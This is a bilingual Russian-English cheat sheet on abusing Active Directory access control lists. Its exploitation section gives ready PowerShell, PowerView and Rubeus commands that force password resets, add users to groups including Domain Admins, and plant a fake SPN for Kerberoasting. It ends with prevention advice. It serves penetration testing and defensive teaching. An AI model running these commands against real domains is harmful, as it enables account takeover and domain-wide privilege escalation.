# ACLs Abuse 

## What is this RU

**ACLs (Access Control Lists)** - это механизмы контроля доступа в операционных системах, включая Windows, Linux и другие. Они определяют, какие пользователи или группы могут получать доступ к ресурсам, таким как файлы, каталоги, реестр и другие объекты.
ACLs содержат списки прав доступа, которые могут быть назначены пользователям или группам. Эти права доступа могут включать чтение, запись, выполнение и другие операции, в зависимости от типа ресурса. Кроме того, ACLs могут определять, какие пользователи или группы могут изменять права доступа к ресурсу.

## What is this EN

**ACLs (Access Control Lists)** - are access control mechanisms in operating systems, including Windows, Linux, and others. They define which users or groups can access resources, such as files, directories, the registry, and other objects.
ACLs contain lists of access rights that can be assigned to users or groups. These access rights can include read, write, execute, and other operations, depending on the type of resource. In addition, ACLs can define which users or groups can modify access rights to a resource.

## Explotation

### ACL ForceChangePassword

Creating a PSCredential Object for our user 
```
$SecPassword = ConvertTo-SecureString 'Password@123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\william', $SecPassword)
```

ChangePassword
```
$Password = ConvertTo-SecureString "Password@123!" -AsPlainText -Force
Set-ADAccountPassword -Identity "acluser" -Reset -NewPassword $Password
```

With PowerView
```
$Password = ConvertTo-SecureString "Password@123!" -AsPlainText -Force
Set-DomainUserPassword -Identity jamal -AccountPassword $Password -Credential $Cred -Verbose
```

### ACL GenericWrite to Group

Creating a SecureString Object
```
$SecPassword = ConvertTo-SecureString 'Password@123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\roberto', $SecPassword)
```

Adding user to Group Powerview
```
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'jamal' -Credential $Cred -Verbose
```

### ACL GenericWrite to User

Creating a SecureString Object
```
$SecPassword = ConvertTo-SecureString 'Password@123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\roberto', $SecPassword)
```

Adding spn object to Kerberoasting 
```
Set-DomainObject -Credential $Cred -Identity jamal -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Kerberoasting with Rubeus 
```
.\Rubeus.exe kerberoast /user:jamal /nowrap
```

Removing the Fake SPN 
```
Set-DomainObject -Credential $Cred -Identity jamal -Clear serviceprincipalname -Verbose
```

### ACL GenericAll to User

Check ACLS with PowerView to User
```
Get-ObjectAcl -SamAccountName jamal -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

Abuse GenericAll
```
net user jamal 'Password@123!' /domain
```

### ACL GenericAll to Group

Check ACLS with Powerview to Group
```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=domain,DC=local"}
```

Add to group
```
net group "domain admins" roberto /add /domain
```

## Prevent RU 

<ol>
<li>Используйте принцип наименьших привилегий (least privilege): Назначайте только те права доступа, которые необходимы пользователю или группе для выполнения своих задач, но не больше. Это поможет предотвратить злоупотребления и уменьшить риск несанкционированного доступа.</li>
<li>Регулярно проверяйте и анализируйте ACL: Проверяйте, имеют ли пользователи и группы на ресурсы необходимые права доступа, и удаляйте ненужные права, чтобы снизить риск злоупотребления.</li>
<li>Ограничьте доступ к управлению ACL: Убедитесь, что доступ к управлению ACL имеют только необходимые лица, такие как администраторы системы, и что доступ осуществляется только через защищенные каналы связи.
</li>
<li>Используйте мониторинг безопасности: Настройте мониторинг безопасности, чтобы отслеживать изменения в ACL и обнаруживать любые необычные активности. Это поможет быстро обнаружить и предотвратить злоупотребления с правами доступа.</li>
<li>Используйте инструменты управления правами доступа: Используйте специальные инструменты, такие как системы управления правами доступа, которые могут помочь автоматизировать процесс управления правами доступа и снизить риск ошибок при настройке ACL.</li>
</ol>

## Prevent EN

<ol>
<li>Use the least privilege principle: Assign only the permissions that are necessary for users or groups to perform their tasks, and no more. This can help prevent abuse and reduce the risk of unauthorized access.
</li>
<li>Regularly review and analyze ACLs: Check whether users and groups have the necessary permissions to resources and remove unnecessary permissions to reduce the risk of abuse.
</li>
<li>Limit access to ACL management: Ensure that only necessary personnel, such as system administrators, have access to ACL management, and that access is only through secure communication channels.
</li>
<li>Use security monitoring: Configure security monitoring to track changes in ACLs and detect any unusual activity. This can help quickly detect and prevent abuses of access rights.
</li>
<li>Use access management tools: Use specialized tools, such as access management systems, to help automate the access management process and reduce the risk of errors when configuring ACLs.
</li>
</ol>